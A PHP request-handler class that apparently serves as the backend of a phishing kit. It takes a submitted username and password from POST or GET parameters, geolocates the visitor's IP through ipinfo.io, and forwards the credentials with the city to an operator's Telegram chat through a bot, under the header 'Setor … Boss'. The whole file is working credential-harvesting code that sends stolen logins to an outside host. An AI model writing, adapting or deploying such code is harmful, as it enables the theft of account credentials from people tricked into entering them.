<?php

namespace App\Action;

use Psr\Http\Message\ResponseInterface;
use Psr\Http\Message\ServerRequestInterface;
use Psr\Container\ContainerInterface;
use Cvar1984\SultanHerbal\Telegram;

final class SetorAction
{
    public function __construct(Telegram $telegram)
    {
        $this->telegram = $telegram;
    }

    public function __invoke(
        ServerRequestInterface $request,
        ResponseInterface $response, $args
    ) : ResponseInterface
    {
        $method = $request->getMethod();
        $telegram = $this->telegram;

        if ($method == 'POST') {

            $args = array_merge($args, $request
                ->getParsedBody());
        }
        elseif($method == 'GET') {
            $args = array_merge($args, $request
                ->getQueryParams());
        }
        
        $ip = $_SERVER['REMOTE_ADDR'];
        $details = json_decode(
            file_get_contents("http://ipinfo.io/{$ip}/json")
        );

        if(empty($args['username'] && $args['password'])) {
            $response->getBody()->write('Can\'t empty');
            return $response;
        }

        ob_start();
        echo "===== Setor {$args['type']} Boss =====\n";
        echo 'Username: *' . $args['username'] . "*\n";
        echo 'Password: *' . $args['password'] . "*\n";
        echo !isset($details->city) ? "Lokasi ip: *Tidak diketahui*\n" : 'Lokasi ip: *' . $details->city . "*\n";
        $dataPembeli = ob_get_clean();
        
        $status = $telegram->bot(
            'sendMessage',
            [
                'chat_id' => Telegram::BOT_DEBUG_CHAT_ID,
                'text' => $dataPembeli,
                'parse_mode' => 'Markdown',
            ]
        );
        return $response;
    }
}
